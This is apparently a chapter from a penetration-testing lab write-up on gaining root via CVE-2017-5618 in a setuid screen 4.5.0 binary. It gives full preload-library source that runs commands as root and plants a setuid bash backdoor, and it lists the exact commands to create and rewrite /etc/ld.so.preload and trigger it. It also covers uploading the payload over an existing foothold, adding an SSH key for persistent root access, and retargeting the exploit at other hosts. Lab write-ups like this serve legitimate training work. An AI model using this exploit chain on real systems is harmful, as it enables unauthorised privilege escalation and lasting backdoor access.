# 06 — Privilege escalation: setuid screen 4.5.0

One setuid binary, one old release, one file it creates as root. This chapter is the whole box.

---

## 6.1 The contradiction

```
/usr/bin/screen -> screen-4.5.0
-rwsr-xr-x 1 root root 1860304 May 10  2021 /usr/bin/screen-4.5.0
-rwxr-xr-x 1 root root  474280 Feb 23  2021 /usr/bin/screen.old
```

and the package database:

```bash
dpkg -l | grep -E "^ii  screen"
```

```
ii  screen  4.8.0-1ubuntu0.1  amd64  terminal multiplexer with VT100/ANSI terminal emulation
```

The **package** is `4.8.0-1ubuntu0.1` — Ubuntu's fully patched build. The **binary being executed** is
`4.5.0`, setuid root, reached through a symlink. `dpkg` is describing a file that is no longer the
one on the path.

This is the single most important lesson on this box: **`dpkg -l`, `apt list --installed` and every
scanner that reads them will report this host as patched.** The version string in the package
database is metadata about what *should* be installed. `ls -la /usr/bin/screen*` is metadata about
what *is*.

`screen 4.5.0` is the last release affected by **CVE-2017-5618**.

---

## 6.2 What the bug actually is

`screen -L` writes a log of the session to a file. In 4.5.0, when screen is installed setuid root, it
does **not** drop privileges before creating that log file, and it derives the file's permissions
from the caller's `umask`.

Two consequences, both attacker-controlled:

1. **The path is relative to the caller's working directory.** Run it from `/etc` and the log file is
   created in `/etc`.
2. **The mode comes from `umask`.** `umask 000` before invoking it produces a file that is
   world-writable — created by root, owned by root, but writable by us.

So a setuid-root program hands an unprivileged user a root-owned, world-writable file **anywhere on
the filesystem**, plus the ability to append to it through screen's own logging.

The obvious landing spot is `/etc/ld.so.preload` — the dynamic loader's "preload these libraries
into every process" file. If we can write there, the next setuid-root binary that starts loads our
shared object **as root**, before `main()` runs.

`screen 4.5.1` fixed it by refusing to use a setuid configuration and by opening the log with
`O_NOFOLLOW|O_EXCL`.

The rest of this chapter is the payload's life cycle: where it comes from, what has to be changed in
it, how it gets onto a host that has no compiler, and how it is run. Commands are labelled with the
machine they belong on, because **none of them work on the other one**.

---

## 6.3 Getting the payload (on Kali)

The public exploit is Exploit-DB **41154** (`screen 4.5.0 - Local Privilege Escalation`). It ships a
`libhax.c`, a `rootsh` script and a `41154.sh` that compiles, uploads and triggers. Copy it out of
`searchsploit` once and treat the two payload files as source you own — not as a black box:

```bash
searchsploit -m linux/local/41154.sh
ls -la
```

```
41154.sh
libhax.c        # extracted by the script, or copy from exploit-db
rootsh
```

Everything below is in this repo's [`files/`](files/) directory, already built and verified:

| File | Role |
|---|---|
| [`files/libhax.c`](files/libhax.c) | preload library source — runs in `ld.so`, as root |
| [`files/libhax.so`](files/libhax.so) | the compiled, stripped artifact that is delivered (`14 208` bytes, `sha256 4b5b1342…e19733`) |
| [`files/rootcmd.sh`](files/rootcmd.sh) | what root should do; executed by the library, output to a file |

Keeping the `.so` **in the repo** matters: the toolchain on the attacking box is not the toolchain
that produced yesterday's artefact, and a rebuilt `.so` must be hash-matched to what was tested.

---

## 6.4 Modifying it (on Kali)

The upstream `libhax.c` is close, but three things in it decide whether you get root or a convincing
nothing. All three are edits you make **before** compiling.

```c
#define STAGE  "/tmp/screenroot"
#define LOCK   STAGE "/.lock"
#define SCRIPT STAGE "/rootcmd.sh"
#define OUT    STAGE "/rootout.txt"

__attribute__ ((__constructor__))
void dropshell(void)
{
    if (geteuid() != 0)                 /* every process loads it; only act as root */
        return;

    int fd = open(LOCK, O_CREAT | O_EXCL | O_WRONLY, 0600);
    if (fd < 0)                         /* single-shot: never run twice */
        return;
    close(fd);

    unlink("/etc/ld.so.preload");        /* remove ourselves before spawning children */

    setgid(0);
    setuid(0);

    system("/bin/sh " SCRIPT " > " OUT " 2>&1");
    chmod(OUT, 0666);
}
```

**Edit 1 — the three paths.** `STAGE` is where the library looks for its script and writes its
output. It must be a directory the unprivileged user can create and write, because the *attacker*
populates it; the constructor only reads from it as root. `/tmp/...` is the usual choice. This is the
one block to change when retargeting (§6.11).

**Edit 2 — `setgid(0); setuid(0);` before `system()`.** This is the line the published payload usually
leaves out, and without it the exploit *appears* to work. A setuid process starts with `uid=1000`,
`euid=0`. dash and bash both check `uid != euid` at startup and voluntarily drop the effective uid
unless invoked with `-p`. So `system()` succeeds, the constructor's own calls run as root, and the
shell it spawns does not:

```
uid=1000(aero) gid=1000(aero) groups=1000(aero)
--- proof.txt ---
cat: /root/proof.txt: Permission denied
--- artifacts ---
-rwsr-xr-x 1 aero aero 1183448 /tmp/screenroot/rbash
```

That is a `chmod 4755` copy of bash **owned by `aero`** — setuid, plausible-looking, and worth
nothing. Normalising the real uid and gid to 0 first means the child has no reason to drop:

```
uid=0(root) gid=0(root) groups=0(root)
```

**Edit 3 — keep the guard, the lock and the unlink.** Each is load-bearing:

- **`geteuid() != 0` guard.** `/etc/ld.so.preload` is read by *every* dynamic binary, including the
  ones our own shell spawns. Without the guard the constructor would recurse into every command.
- **`.lock` with `O_CREAT|O_EXCL`.** Several setuid processes may start within the same second.
  `O_EXCL` makes exactly one of them win — which also matters on a retry: while `.lock` exists the
  payload refuses to run again, so a second attempt silently does nothing until it is deleted.
- **`unlink("/etc/ld.so.preload")` before `system()`.** The child shell is a dynamic binary; if the
  preload file is still there, *it* loads the library too, and `system()` runs inside a process that
  already ran `system()`. Removing the file first makes the export single-use and keeps the tree
  finite.

---

## 6.5 Building it (on Kali)

Build against the **oldest ABI that will run**, not against your own glibc (chapter 05, §5.4). One
`objdump` line checks it:

```bash
gcc -Os -fPIC -shared -fno-stack-protector -fno-asynchronous-unwind-tables \
    -o libhax.so libhax.c
strip --strip-unneeded libhax.so
objdump -T libhax.so | grep -oE 'GLIBC_[0-9.]+' | sort -uV
```

```
GLIBC_2.2.5
```

A second version string in that list — `GLIBC_2.34`, `GLIBC_2.38` — means the library was built
against a newer glibc than the target has, and the loader will refuse it at trigger time. Rebuild in
an older container rather than hoping.

```bash
ls -l libhax.so && sha256sum libhax.so
```

```
-rwxrwxr-x 1 kali kali 14208 libhax.so
4b5b134289a961d498c3640ca7e3ad4a780606364005a9ed7c94e82295e19733  libhax.so
```

That hash is what the upload step compares against.

---

## 6.6 Delivering it (on Kali → on target)

The target has no compiler and no route to one: egress is a port allowlist (chapter 04, §4.4), so no
`apt`, no `wget`, no `git clone`. A terminal over the reverse shell is a bad pipe for a 14 KB shared
object. The file travels over the **Aerospike socket** that gave code execution, chunked and
hash-verified (chapter 04, §4.6).

**On Kali** — send both files, into the stage directory the payload expects:

```bash
AHOST=192.168.150.143 python3 scripts/poc_aerospike_upload.py \
  --local files/libhax.so --remote /tmp/screenroot/libhax.so --mode 755

AHOST=192.168.150.143 python3 scripts/poc_aerospike_upload.py \
  --local files/rootcmd.sh --remote /tmp/screenroot/rootcmd.sh --mode 755
```

```
[+] uploading files/libhax.so (14208 bytes) -> /tmp/screenroot/libhax.so
[+] local sha256 4b5b134289a961d498c3640ca7e3ad4a780606364005a9ed7c94e82295e19733
    sent 18944 b64 chars
[+] remote: 4b5b134289a961d498c3640ca7e3ad4a780606364005a9ed7c94e82295e19733  /tmp/screenroot/libhax.so
[+] hash match — the file arrived intact
```

**On target** — the result, and the one thing to check before going further:

```bash
ls -la /tmp/screenroot
```

```
-rwxr-xr-x 1 aero aero 14208 libhax.so
-rwxr-xr-x 1 aero aero   494 rootcmd.sh
```

Check the **size** and the hash, not just the name. A truncated upload is a valid ELF header followed
by garbage, and the loader's complaint (`invalid ELF header` / `cannot open shared object file`) is
swallowed by `io.popen` unless you append `2>&1`.

> A host that has been half-exploited already (see §6.7) prefixes the output of **every** command with
> `ERROR: ld.so: object … ignored.` Those lines land in front of `sha256sum` output, so the digest has
> to be matched by pattern, never by position — the uploader does this and still reports
> `hash mismatch` on the first version that did not.

---

## 6.7 Creating the root-owned preload file (on target)

This is the actual exploit, and it is worth understanding **who is allowed to do what**, because it
determines what you can re-run:

| Actor | Create `/etc/ld.so.preload` | Write to it if it exists and is `0666` |
|---|---|---|
| `aero` | **no** — `/etc` is root-owned `0755`, `printf > …` returns `rc=2` | **yes** |
| setuid `screen` | **yes** — as root, with the mode from `umask` | yes |

So the file must be created **by screen** every time. Running as `aero`:

```bash
printf '/tmp/screenroot/libhax.so\n' > /etc/ld.so.preload; echo rc=$?
```

```
rc=2
```

`rc=2` with no file is not a permissions accident to work around — it is the proof that this step is
the vulnerability. The creation has to come from the setuid binary:

```bash
cd /etc && umask 000 && \
screen -D -m -L ld.so.preload /bin/sh -c 'printf "\n/tmp/screenroot/libhax.so\n"' >/dev/null 2>&1
stat -c "%A %U:%G %s %n" /etc/ld.so.preload
```

```
-rw-rw-rw- root:aero 29 /etc/ld.so.preload
```

Root-owned, **world-writable**, 29 bytes. `umask 000` did its job. Note what just happened: a
transient `screen` session whose *log file* is an arbitrary path we chose, created as root.

---

## 6.8 Rewriting it clean — and the CRLF trap (on target)

The file exists. It does not work:

```bash
cat -A /etc/ld.so.preload
```

```
^M$
/tmp/screenroot/libhax.so^M$
```

`screen`'s logger writes **CRLF**. It is a terminal multiplexer — its log is a transcript of a
terminal, and terminals end lines with `\r\n`. `ld.so` treats the trailing carriage return as part of
the filename, so it tries to open `/tmp/screenroot/libhax.so\r`, which does not exist, and **silently
continues**:

```
ERROR: ld.so: object '\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '/tmp/screenroot/libhax.so\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
```

The box looks like it worked. Check bytes, not text — `cat -A` shows `^M$` for a CRLF line and `$` for
a clean one.

The file is `0666`, so `aero` can rewrite it without any privilege at all. This is the step everyone
skips: **the creation primitive gave us root ownership; the `0666` mode is what gives us a correcting
write.**

```bash
printf '/tmp/screenroot/libhax.so\n' > /etc/ld.so.preload && cat -A /etc/ld.so.preload
```

```
/tmp/screenroot/libhax.so$
```

One clean LF-terminated path, no `^M`. Only now is the preload file usable.

> **A leftover preload is a fingerprint.** This rebuild arrived with
> `-rw-rw-rw- root:aero 16 /etc/ld.so.preload` containing `^M$` then `/tmp/libhax.so`, and no such
> file on disk — an earlier attempt that created the file, never cleaned the CRLF, and never
> delivered the library. Every dynamic binary on the host was printing two `ld.so` errors. That is
> what a half-finished CVE-2017-5618 looks like from the outside, and it is also a reminder to remove
> the file (§7.2): a preload pointing at a deleted library degrades every command on the box.

---

## 6.9 Triggering it (on target)

`/etc/ld.so.preload` is only read when a dynamic binary starts. Any setuid-root binary will do, and
the convenient one is the same program we abused to create the file:

```bash
screen -ls >/dev/null 2>&1
```

That is a setuid-root `screen`. The loader reads the preload file, maps `libhax.so`, runs the
constructor as `euid 0`, the constructor takes the lock, deletes the preload file, normalises
credentials and executes `rootcmd.sh` as root.

Two seconds later:

```bash
ls -la /etc/ld.so.preload; cat /tmp/screenroot/rootout.txt
```

```
ls: cannot access '/etc/ld.so.preload': No such file or directory
uid=0(root) gid=0(root) groups=0(root)
lab-pwk2-student-cl4-143-ubuntu20-aero-241-102
--- proof.txt ---
35aeb3da308d9bf53be4d0d728d5f71e
--- artifacts ---
-rwsr-xr-x 1 root root 1183448 /tmp/screenroot/rbash
```

The preload file is gone because the payload removed it — that is the self-cleaning step working, not
a failure. `rbash` is a setuid copy of bash, kept for interactive use:

```bash
ls -la /tmp/screenroot/rbash
```

```
-rwsr-xr-x 1 root root 1183448 /tmp/screenroot/rbash
```

`root root` and the `s` bit are the difference between this and the failed run in §6.4. If you see
`aero aero` there, `setuid(0)` is missing from the payload.

> **Retry note.** The constructor is single-shot. On a second attempt it returns immediately while
> `/tmp/screenroot/.lock` exists, and the self-cleaning `unlink()` means `/etc/ld.so.preload` is gone
> too — so a retry needs *both* a fresh `rm -f /tmp/screenroot/.lock` and a fresh creation step
> (§6.7). Skipping either produces a trigger that does nothing at all, with no error, because a
> missing preload file is not an error.

Every failure seen on this box, in order:

| Symptom | Cause |
|---|---|
| `ERROR: ld.so: object '…\r' … ignored` | preload written by screen's logger with CRLF; path ends in `\r` |
| `printf > /etc/ld.so.preload` → `rc=2` | file does not exist and `aero` cannot create it in `/etc`; only screen can |
| preload gone, no output file | preload was rewritten while the file no longer existed, so the trigger had nothing to load |
| preload gone, `rootout.txt` absent, second attempt in a row | `.lock` still present from the previous run |
| `uid=1000(aero)` in `rootout.txt`, `rbash` owned by `aero` | `setuid(0)` missing: the shell dropped privileges when `uid != euid` |
| trigger does nothing, no `ld.so` warnings | preload file genuinely absent — re-run creation (§6.7) |

---

## 6.10 The interactive shell

A setuid bash gives `euid=0` with `uid` still `aero`:

```bash
/tmp/screenroot/rbash -p -c 'id'
```

```
uid=1000(aero) gid=1000(aero) euid=0(root) groups=1000(aero)
```

That is enough to read anything, but it is not a comfortable session — `sudo` still asks `aero` for a
password, and some tools behave differently when `uid != euid`. The clean finish is a key:

```bash
ssh-keygen -t ed25519 -N "" -f /tmp/exam_key -C exam-root
```

Push `exam_key.pub` through the same socket, then, as root:

```bash
mkdir -p /root/.ssh
cp /tmp/screenroot/exam_key.pub /root/.ssh/authorized_keys
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
```

```bash
ssh -i /tmp/exam_key root@192.168.150.143
```

```
root@lab-pwk2-student-cl4-143-ubuntu20-aero-242-100:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> A quoting note, because it cost a round trip: writing the key with
> `rbash -c "echo \"ssh-ed25519 …\""` through the UDF layer mangles the quotes and produces an empty
> file (`wc -c` → `0`). Upload the `.pub` as a **file** and `cp` it into place. Avoid nesting three
> levels of quoting across a socket.

---

## 6.11 Retargeting it at another host

The payload is portable because nothing in it is host-specific except the three paths in §6.4. To run
this against a different target:

**On Kali — edit and rebuild.** Change `STAGE`/`LOCK`/`SCRIPT`/`OUT` together (they must agree), then:

```bash
gcc -Os -fPIC -shared -fno-stack-protector -fno-asynchronous-unwind-tables \
    -o libhax.so libhax.c && strip --strip-unneeded libhax.so
sha256sum libhax.so
```

**On Kali — deliver to the new address.** Nothing else changes:

```bash
AHOST=<new-host> python3 scripts/poc_aerospike_upload.py \
  --local libhax.so --remote /tmp/screenroot/libhax.so --mode 755
```

**On target — create, rewrite, trigger** (§6.7–6.9). Check the preconditions first, because they are
what actually fail on a different image:

```bash
ls -la /usr/bin/screen*                 # must show -rwsr-xr-x … screen-4.5.0
dpkg -l | grep -E '^ii  screen'         # will lie — that is the point of §6.1
mount | grep ' /tmp '                   # tmpfs with noexec is fine: the .so is mmap'd, not exec'd
```

Three host-specific gotchas:

- **`noexec` on `/tmp`** does not block `dlopen`/preload — the loader maps the library, it does not
  `execve` it. A `noexec` mount *does* block a payload that drops a binary and runs it, which is why
  this technique survives where "upload and execute" fails.
- **A different stage path** must be writable by the unprivileged user, and reachable by root at
  trigger time. `/tmp` and `/var/tmp` are the safe choices; `/home/<user>` is fine unless the target
  mounts `/home` `nosuid,nodev` with restrictive modes.
- **`rbash` is a real backdoor.** It is a root-owned setuid shell. Remove it during cleanup
  (§7.2) — on a live engagement it is the difference between "report written" and "incident".

The general shape is worth remembering beyond this box: **one vulnerability creates the file, a
different weakness makes it correctable, and the payload's own shutdown determines whether it is
single-use.** Here that is `screen -L` → `umask 000` → `unlink()` in the constructor.
